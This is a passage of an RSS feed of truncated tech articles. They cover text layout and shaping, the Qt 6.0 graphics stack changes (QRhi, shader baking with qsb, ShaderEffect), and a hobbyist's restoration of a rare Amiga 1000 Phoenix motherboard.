<p><em>Another</em> whole class of complexity is emoji. A lot of emoji can be rendered with either <a href="https://en.wikipedia.org/wiki/Emoji#Emoji_versus_text_presentation">text or emoji presentation</a>, and there are no hard and fast rules to pick one or the other. Generally the text presentation is in a symbol font, and the emoji presentation is in a separate color font. A particularly tough example is the smiling emoji, which began its encoding life as 0x01 in <a href="https://en.wikipedia.org/wiki/Code_page_437">Code page 437</a>, the standard 8-bit character encoding of the original IBM PC, and is now U+263A in Unicode. However, the suggested default presentation is text, which won’t do in a world which expects color. Apple on iOS unilaterally chose an emoji presentation, so many text stacks follow Apple’s lead. (Incidentally, the most robust way to encode such emoji is to append a <a href="https://en.wikipedia.org/wiki/Variation_Selectors_(Unicode_block)">variation selector</a> to pin down the presentation.)</p>

<p>Another source of complexity when trying to write a cross-platform text layout engine is querying the system fonts. See <a href="https://raphlinus.github.io/rust/skribo/text/2019/04/04/font-fallback.html">Font fallback deep dive</a> for more information about that.</p>

<p>I should note one thing, which might help people doing archaeology of legacy text stacks: it used to be pretty common for text layout to resolve “compatibility” forms such as NFKC and NFKD, and this can lead to various problems. But today it is more common to solve that particular problem by providing a font stack with <em>massive</em> Unicode coverage, including all the code points in the relevant compatibility ranges.</p>

<h3 id="script">Script</h3>

<p>The <em>shaping</em> of text, or the transformation of a sequence of code points into a sequence of positioned glyphs, depends on the script. Some scripts, such as Arabic and Devanagari, have extremely elaborate shaping rules, while others, such as Chinese, are a fairly straightforward mapping from code point into glyph. Latin is somewhere in the middle, starting with a straightforward mapping, but ligatures and kerning are also required for high quality text layout.</p>

<p>Determining script runs is reasonably straightforward - many characters have a Unicode script property which uniquely identifies which script they belong to. However, some characters, such as space, are “common,” so the assigned script just continues the previous run.</p>

<p>A simple example is “hello мир”. This string is broken into two script runs: “hello “ is <code>Latn</code>, and “мир” is <code>Cyrl</code>.</p>

<h3 id="shaping-cluster">Shaping (cluster)</h3>

<p>At this point, we have a run of constant style, font, direction, and script. It is ready for <em>shaping.</em> Shaping is a complicated process that converts a string (sequence of Unicode code points) into positioned glyphs. For the purpose of this blog post, we can generally treat it as a black box. Fortunately, a very high quality open source implementation exists, in the form of HarfBuzz.</p>

<p>We’re not <em>quite</em> done with segmentation, though, as shaping assigns substrings in the input to <a href="https://harfbuzz.github.io/clusters.html">clusters</a> of glyphs. The correspondence depends a lot on the font. In Latin, the string “fi” is often shaped to a single glyph (a ligature). For complex scripts such as Devanagari, a cluster is most often a syllable in the source text, and complex reordering can happen within the cluster.</p>

<p>Clusters are important for <em>hit testing,</em> or determining the correspondence between a physical cursor position in the text layout and the offset within the text. Generally, they can be ignored if the text will only be rendered, not edited (or selected).</p>

<p>Note that these shaping clusters are distinct from grapheme clusters. The “fi” example has two grapheme clusters but a single shaping cluster, so a grapheme cluster boundary can cut a shaping cluster. Since …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://raphlinus.github.io/text/2020/10/26/text-layout.html">https://raphlinus.github.io/text/2020/10/26/text-layout.html</a></em></p>]]>
            </description>
            <link>https://raphlinus.github.io/text/2020/10/26/text-layout.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24906010</guid>
            <pubDate>Tue, 27 Oct 2020 10:25:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Graphics in Qt 6.0: QRhi, Qt Quick, Qt Quick 3D]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 52 (<a href="https://news.ycombinator.com/item?id=24905634">thread link</a>) | @MikusR
<br/>
October 27, 2020 | https://www.qt.io/blog/graphics-in-qt-6.0-qrhi-qt-quick-qt-quick-3d | <a href="https://web.archive.org/web/*/https://www.qt.io/blog/graphics-in-qt-6.0-qrhi-qt-quick-qt-quick-3d">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                            

                            <p>
                                Monday October 26, 2020 by <a href="https://www.qt.io/blog/author/laszlo-agocs">Laszlo Agocs</a> | <a href="#commento">Comments</a>
                            </p>
                            
                            <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Last year we had a three part blog series about Qt's new approach to working with 3D graphics APIs and shading languages: <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-direct3d">part 1</a>, <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-and-direct3d-part-2">part 2</a>, <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-and-direct3d-part-3">part 3</a>. For <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-index.html">Qt Quick</a>, an early, opt-in preview of the new rendering architecture was shipped in Qt 5.14, with some improvements in Qt 5.15. With the release of Qt 6.0 upcoming, let's see what has happened since Qt 5.15. It will not be possible to cover every detail of the graphics stack improvements for Qt Quick here, let alone dive into the vast amount of Qt Quick 3D features, many of which are new or improved in Qt 6.0. Rather, the aim is just to give an overview of what can be expected from the graphics stack perspective when Qt 6.0 ships later this year.</p>
<p>Note that the documentation links refer to the Qt 6 snapshot documentation. This allows seeing the latest C++ and QML API pages, including all changed and new functions, but the content is also not final. These links may also break later on.</p>
<!--more-->
<h2>QRhi improvements</h2>
<p>QRhi, the Qt Rendering Hardware Interface, is Qt's internal graphics abstraction when 3D APIs, such as OpenGL, Vulkan, Metal, and Direct 3D, are involved. Compared to 5.15, the main improvements in 6.0 are a lot of polishing fixes here and there, and, most importantly, a large set of performance optimizations. While benefitting Qt Quick as well, these become especially important with Qt Quick 3D when complex scenes with many renderable objects are involved.</p>
<p>With some simplifications, the main layers of the Qt 6.0 graphics stack can be visualized like this:</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=800&amp;name=rhiarch-3.png" alt="rhiarch-3" width="800" srcset="https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=400&amp;name=rhiarch-3.png 400w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=800&amp;name=rhiarch-3.png 800w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=1200&amp;name=rhiarch-3.png 1200w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=1600&amp;name=rhiarch-3.png 1600w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=2000&amp;name=rhiarch-3.png 2000w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=2400&amp;name=rhiarch-3.png 2400w" sizes="(max-width: 800px) 100vw, 800px"></p>
<h2>Shader management</h2>
<p>The Qt Shader Tools module is now a selectable module in the installer. For applications this can be relevant because this is the module that provides the <em>qsb</em> command-line tool (not to be confused with <em>qbs</em>) and its associated CMake build system integration. In addition, the module is a mandatory dependency for Qt Quick 3D at the moment.</p>
<p>Qt 6 no longer uses OpenGL-compatible GLSL source snippets directly. Rather, shaders are all written in Vulkan-style GLSL, then reflected and translated to other shading languages, and finally packaged up into a serializable QShader object that can be consumed by QRhi. The shader preparation pipeline in Qt 6 is the following:</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1280&amp;name=shaderconditioning.png" alt="shaderconditioning" width="1280" srcset="https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=640&amp;name=shaderconditioning.png 640w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1280&amp;name=shaderconditioning.png 1280w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1920&amp;name=shaderconditioning.png 1920w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=2560&amp;name=shaderconditioning.png 2560w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=3200&amp;name=shaderconditioning.png 3200w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=3840&amp;name=shaderconditioning.png 3840w" sizes="(max-width: 1280px) 100vw, 1280px"></p>
<p>In QML applications using Qt Quick, whenever working with ShaderEffect, or subclassing QSGMaterialShader, the application will need to provide a baked shader pack in form of a .qsb file. These are generated by the <em>qsb</em> tool. This does not however mean that developers have to start dealing with a new tool directly: with the CMake integration one can easily list the vertex, fragment, and compute shaders in CMakeLists.txt via the qt6_add_shaders() CMake function. Invoking qsb and packing the resulting .qsb files into the Qt resource system is then taken care of by the build system.</p>
<p>See <a href="https://doc-snapshots.qt.io/qt6-dev/qtshadertools-index.html">the shadertools documentation</a> for an overview of how graphics and compute shaders are handled in Qt 6 and the details of the qsb tool and its CMake integration.</p>
<h2>Direct OpenGL is no more for Qt Quick</h2>
<p>In Qt 5.14 and 5.15, Qt Quick shipped with an optional QRhi-based rendering path that could be enabled by setting the environment variable <em>QSG_RHI</em>. This allowed painless experimenting with the new stack, while keeping the traditional, battle tested direct OpenGL code path the default.</p>
<p>In Qt 6.0 all such switches are gone. There is no way get rendering go directly to OpenGL with Qt Quick scenes. Rather, the new default is the QRhi-based rendering path of the Qt Quick scene graph. Other than the defaults changing, the ways to configure what QRhi backend, and so which graphics API to use are mostly unchanged compared to Qt 5.15. See <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-visualcanvas-scenegraph-renderer.html#rendering-via-the-qt-rendering-hardware-interface">the documentation</a> for details. One difference is better API naming: in C++ code to request, and so effectively tie the application to, a given QRhi backend (and by extension graphics API) is now done through the <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#setGraphicsApi">QQuickWindow::setGraphicsApi()</a> function, whereas in 5.15 this task used to be pushed onto an overload of setSceneGraphBackend(), leading to fairly inaccurate naming.</p>
<p>There are a number of implications, although many applications will not notice any of these. If an application uses neither shader code (ShaderEffect, QSGMaterial) nor does it perform its own rendering with OpenGL directly, there is a very high chance that it will need no migration steps at all. (at least not because of graphics)</p>
<h4>Applications using OpenGL directly</h4>
<p>What about applications that use OpenGL directly in one way or another, and are not interested in functioning with other graphics APIs? For example, applications that use <a href="https://doc-snapshots.qt.io/qt6-dev/qquickframebufferobject.html">QQuickFramebufferObject</a>, or connect to signals like <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#beforeRendering">QQuickWindow::beforeRendering()</a> to inject their own OpenGL rendering under or above the Qt Quick scene. This is when the setGraphicsApi() function mentioned above comes into play for real: if an application wishes, it can always state that it wants OpenGL (or Vulkan, or Metal, or D3D) only, and nothing else. That way it is guaranteed that Qt Quick is going to use the corresponding QRhi backend (or else it will fail to initialize), so the application can safely assume that going directly to OpenGL is safe, because Qt Quick will also end up rendering through OpenGL. Note that this does not exempt the application from having to do other type of porting steps: for example, if it in addition uses ShaderEffect or creates its own custom materials, it will still need to migrate to the new ways of handling shaders and materials.</p>
<h4>QSG* and QQuick* API changes</h4>
<p>The API changes mainly fall into 3 categories. This is not going to be an exhaustive list, but rather just a peek at some of the important changes. Detailed change lists and porting guides are expected to be available with the final Qt 6.0 release.</p>
<ul>
<li>
<div><p>Different approach to shaders and materials: <a href="https://doc-snapshots.qt.io/qt6-dev/qsgmaterialshader.html">QSGMaterialShader</a> received a full revamp (matching more or less what the now-removed QSGMaterialRhiShader used to be in 5.14 and 5.15). <a href="https://doc-snapshots.qt.io/qt6-dev/qml-qtquick-shadereffect.html">ShaderEffect</a> no longer allows inline shader strings. Rather, the vertexShader and fragmentShader properties are URLs, similarly to <span>Image.source</span> and others. They can refer to a local .qsb file, or a .qsb file embedded via the Qt resource system (qrc).</p></div>
</li>
<li>
<p>Removing OpenGL-specifics from QQuickWindow, QSGTexture, and elsewhere. It should come as no surprise that functions like <em>GLuint textureId()</em>, <em>createTextureFromId(GLuint textureId, ...)</em>, or <em>setRenderTarget(GLuint fboId)</em> are now gone. Adopting (wrapping) an existing OpenGL texture, Vulkan image, Metal texture, or D3D11 texture, or accessing the underlying native texture for a QSGTexture is still perfectly possible, but now is done via a different set of APIs, such as <a href="https://doc-snapshots.qt.io/qt6-dev/qnativeinterface-qsgvulkantexture.html">QSGVulkanTexture</a> and the <a href="https://doc-snapshots.qt.io/qt6-dev/qnativeinterface-sub-qtquick.html">other similar classes</a>, instances of which are <a href="https://doc-snapshots.qt.io/qt6-dev/qsgtexture.html?__hstc=233546881.8510e053e4fb66e1a58543a6e9886427.1603454017210.1603454017210.1603454017210.1&amp;__hssc=233546881.1.1603454017210&amp;__hsfp=1285229618#nativeInterface" rel="noopener">queryable from QSGTexure</a>.</p>
<ul>
<li>
<div><p>Integrating the application's own custom rendering with the graphics API that Qt Quick renders with is fully supported, not just for OpenGL, but also Vulkan, Metal, and D3D11. Due to their nature however, some of these APIs will need more than connecting to one single signal like beforeRendering() or afterRendering(). For example, we now also have <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#beforeRenderPassRecording">beforeRenderPassRecording()</a>. See the relevant section in the <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-visualcanvas-scenegraph.html#mixing-scene-graph-and-the-native-graphics-api">scenegraph overview docs</a> for more details and links to examples. Finally, the number of native graphics resources queryable via <a href="https://doc-snapshots.qt.io/qt6-dev/qsgrendererinterface.html">QSGRendererInterface</a> has been extended, now covering Vulkan, Metal, and Direct 3D too.</p></div>
</li>
</ul>
</li>
<li>
<p>Extending support for redirecting the Qt Quick scene into an offscreen render target. <a href="https://www.qt.io/blog/%3Ehttps://doc-snapshots.qt.io/qt6-dev/qquickrendercontrol.html">QQuickRenderControl</a> and the related infrastructure has been heavily enhanced. This was done not just to enable working with graphics APIs other than OpenGL the same way as in Qt 5 (for example, to render a Qt Quick scene into a Vulkan VkImage without an on-screen window), but also to enable integration with AR/VR frameworks and APIs such as <a href="https://www.khronos.org/openxr/">OpenXR</a> (in combination with any of Vulkan, D3D11, or OpenGL). Besides the slightly changed QQuickRenderControl interface, we now have a number of helper classes that improve the configurability of a QQuickWindow: <a href="https://doc-snapshots.qt.io/qt6-dev/qquickrendertarget.html">QQuickRenderTarget</a>, <a href="https://doc-snapshots.qt.io/qt6-dev/qquickgraphicsdevice.html">QQuickGraphicsDevice</a>, and <a href="https://doc-snapshots.qt.io/qt6-dev/qquickgraphicsconfiguration.html">QQuickGraphicsConfiguration</a>. These are essential in scenarios where a more fine grained control is needed: integrating with APIs like OpenXR is not always straightforward when an existing rendering engine is involved, with a number of potential chicken-egg problems when it comes to the creation, initialization, and ownership of instance, device, and other graphics objects: Which Vulkan instance should Qt Quick use, or should it create a new one upon initializing the scenegraph for the first time? Which Vulkan physical device or DXGI adapter should Qt Quick pick, or just stay with the default? Which VkDevice extensions should be enabled in addition to what Qt itself needs? What 2D image/texture should rendering target, who creates that and when? The expectation is that Qt 6.0 will be well-prepared and providing the foundations for further exploring the world of AR/VR during the rest of the Qt 6.x series.</p>
</li>
</ul>
<h4>New approach to handling shader code in ShaderEffect</h4>
<p>A comprehensive example of the new approach to shader code in ShaderEffect is the Qt 6 port of the classic Qt 5 Cinematic Experience demo. <a href="https://github.com/alpqr/qt5-cinematic-experience" rel="noopener">(GitHub repo)</a> This version is ported to CMake and is fully functional with all graphics APIs, including all shader and particle effects.</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/cinematic.png?width=702&amp;name=cinematic.png" alt="cinematic" width="702" srcset="https://www.qt.io/hs-fs/hubfs/cinematic.png?width=351&amp;name=cinematic.png 351w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=702&amp;name=cinematic.png 702w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1053&amp;name=cinematic.png 1053w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1404&amp;name=cinematic.png 1404w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1755&amp;name=cinematic.png 1755w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=2106&amp;name=cinematic.png 2106w" sizes="(max-width: 702px) 100vw, 702px"></p>
<p>Looking at the QML source code, for example the code for the <a href="https://github.com/alpqr/qt5-cinematic-experience/blob/master/content/CurtainEffect.qml" rel="noopener">curtain effect </a>shows that indeed it has all inline GLSL strings removed.</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=354&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png" width="354" srcset="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=177&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 177w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=354&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 354w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=531&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 531w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=708&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 708w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=885&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 885w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=1062&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 1062w" sizes="(max-width: 354px) 100vw, 354px"></p>
<p>Instead, the vertex and fragment shaders now live as <a href="https://github.com/alpqr/qt5-cinematic-experience/tree/master/shaders" rel="noopener">ordinary files in the source tree</a>, not bundled with the application executable anymore.</p>
<p><a href="https://github.com/alpqr/qt5-cinematic-experience/tree/master/shaders" rel="noopener"><img src="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=300&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png" width="300" srcset="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=150&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 150w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=300&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 300w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=450&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 450w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=600&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 600w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=750&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 750w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=900&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 900w" sizes="(max-width: 300px) 100vw, 300px"></a></p>
<p>It is now up to the build system and Qt Shader Tools to compile, reflect, and translate at build time - with the added benefit of shader compilation errors becoming proper build errors instead of …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.qt.io/blog/graphics-in-qt-6.0-qrhi-qt-quick-qt-quick-3d">https://www.qt.io/blog/graphics-in-qt-6.0-qrhi-qt-quick-qt-quick-3d</a></em></p>]]>
            </description>
            <link>https://www.qt.io/blog/graphics-in-qt-6.0-qrhi-qt-quick-qt-quick-3d</link>
            <guid isPermaLink="false">hacker-news-small-sites-24905634</guid>
            <pubDate>Tue, 27 Oct 2020 09:09:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amiga 1000 Phoenix Project]]>
            </title>
            <description>
<![CDATA[
Score 91 | Comments 24 (<a href="https://news.ycombinator.com/item?id=24905247">thread link</a>) | @retrohax
<br/>
October 27, 2020 | https://retrohax.net/amiga-1000-project-phoenix-motherborad/ | <a href="https://web.archive.org/web/*/https://retrohax.net/amiga-1000-project-phoenix-motherborad/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-11666">

<div>
<p>… or failures are your friends :&gt;</p>
<p>&lt;INTRO&gt;</p>
<figure><img src="https://i0.wp.com/imgur.com/xzJXBgG.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/xzJXBgG.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>&lt;/INTRO&gt;</p>
<p>The story behind this whole post is a bit lengthy but I’ll try to be brief 🙂</p>
<p>In August of 2019, I’ve received an email from MrTrinsic. Back then, I didn’t yet know what is coming lol.</p>
<p>It turned out that MrTrinsic is a great Amiga enthusiast and he’d asked me to work on his Amiga 1000 … but no on a standard A1000 but with an Amiga 1000 Phoenix motherboard!</p>
<p>Amiga 1000 Phoenix Enhanced mobo is an extremely rare motherboard replacement for Amiga 1000. Some people think there were no more than 200 units manufactured, others say it was no more than 2000. I’ve no idea either but still, it is very rare so a magic smoke is not an option lol.</p>
<p>This motherboard is an awesome hack in itself and that is why MrTrinsic refers to it as DIVA 😀</p>
<p>Let me quote an excerpt from one of emails.</p>
<p><em>You should mention or point out more clearly that the Phoenix Board is a … DIVA!<br>It is a hack. Just look at the manual what kind of things you can modify and what kind of headers there are to change stuff.<br>The price is that it has an extremely bad signal quality. Plus, it lacks the Buster-Chip that the Amiga 2000 has.<br>The Phoenix is a bad version of the original A2000 from Braunschweig, which in itself was a hacked and beefed-up version of the A1000.<br>Plus, the Phoenix only has two layers. It’s a nightmare as we have seen.</em></p>
<p>It simply always has some problems like stability and compatibility issues which I’ve tried to sort out.</p>
<p>Phoenix mobo was developed in 1989/1990 by our fellow friends from Australia and was one of the very first crowd-funding campaigns! You can read/watch more on one of my fav websites -&gt; <a rel="noreferrer noopener" href="https://www.amigalove.com/viewtopic.php?t=476" target="_blank">www.amigalove.com</a></p>
<p>Hardware specs are available here -&gt;<a rel="noreferrer noopener" href="https://amiga.resource.cx/exp/phoenix" target="_blank"> amiga.resource.cx</a></p>
<h4>The plan</h4>
<p>Initially, MrTrinsic asked me to work on some external floppy replacements by Dell which I will cover in another post. Once I’ve figured out that floppy drive issue he’d decided we should start working on The Phoenix project.</p>
<p>At first, he’d send me a large box with gear that he wanted to have in this Amiga. I was like OMG! Not only Phoenix but the whole large project was about to begin!</p>
<p>The plan was to run lots of modern hardware add-ons with Amiga 1000 Phoenix and later try to squeeze it into a nice looking case, plus make it alive and stable.</p>
<p>The first package arrived and I was really excited by what I’ve seen.</p>
<p>Amiga 1000 Phoenix in an A1000 case with lots of mods and hacks already installed, plus, tons of other hardware mods still in boxes … and that was only for starters …</p>
<figure><img src="https://i0.wp.com/i.imgur.com/eTKSUuT.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/i.imgur.com/eTKSUuT.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/IIqmyaR.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/IIqmyaR.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/KYwUvJJ.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/KYwUvJJ.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/dRdZdns.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/dRdZdns.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/650o3wz.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/650o3wz.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/2lHWTqy.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/2lHWTqy.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/x8f24dT.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/x8f24dT.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/bw37Za0.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/bw37Za0.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/SQd4oOX.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/SQd4oOX.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Obviously, the original plan was to MAKE Amiga 1000 Phoenix GREAT AGAIN!</p>
<p>Jokes aside, the main goal was to run a graphics card along with <a href="http://wiki.icomp.de/wiki/ACA500plus" target="_blank" rel="noreferrer noopener">ACA500plus</a> + <a href="http://wiki.icomp.de/wiki/ACA1233n" target="_blank" rel="noreferrer noopener">ACA1233n</a> accelerator card by iComp</p>
<p>On top of tons of other minor hardware mods, He’d also sent me two graphic cards – <a rel="noreferrer noopener" href="https://shop.mntmn.com/products/zz9000-for-amiga-preorder" target="_blank">ZZ9000 by MNT</a> and GBAPII++ by KryoFlux.</p>
<figure><img src="https://i1.wp.com/imgur.com/fvKi0VG.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/fvKi0VG.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/dg6QzfV.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/dg6QzfV.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<h4>Running it</h4>
<p>First things first. Phoenix motherboard is so rare that I first had to learn how it works and how it is all connected etc.</p>
<p>As it gave me a black screen at the very first run, I had to start learning about jumper settings and the board in general</p>
<p>Below, you can see a block diagram of particular parts location to give you an idea of what is where.</p>
<figure><img src="https://i0.wp.com/imgur.com/1Dz8Jbp.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/1Dz8Jbp.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Of course, I would not move on quickly without MrTrinsics support. He’d pointed me to several sites and sent over some more info about the board itself. One of the most important documents I’ve received was <a rel="noreferrer noopener" href="https://retrohax.net/wp-content/uploads/2020/10/phoenix_jumpers_english.pdf" target="_blank">the jumper settings file</a> along with the <a rel="noreferrer noopener" href="https://retrohax.net/wp-content/uploads/2020/10/Phoenix.pdf" target="_blank">original manual</a>.</p>
<p>The above documents gave me the general idea of how things should work. The very first thing that I did was the removal of all added mods. I’ve then tried to run the A1K but still no luck – black screen. MrTrinsic then pointed me to jumper L35 which could cause such behavior if set incorrectly and bingo! It worked! </p>
<p>Since Phoenix has slots for more than one ROM chip, it is possible to install three KickStarts – 1.3. and 3.1 and third as a custom option. That was already done, along with a switch hack.</p>
<figure><img src="https://i2.wp.com/imgur.com/AtNPAf9.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/AtNPAf9.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/LIOJAzo.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/LIOJAzo.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>The problem was that Amiga wasn’t starting every single time. Instead, it booted every couple of times. My next move was to take it out and try running it outside of the case. This is where I’ve started noticing all the awesome texts on the PCB itself. I took PCB out started shooting pics of those texts and greetz for various hackers of that era.</p>
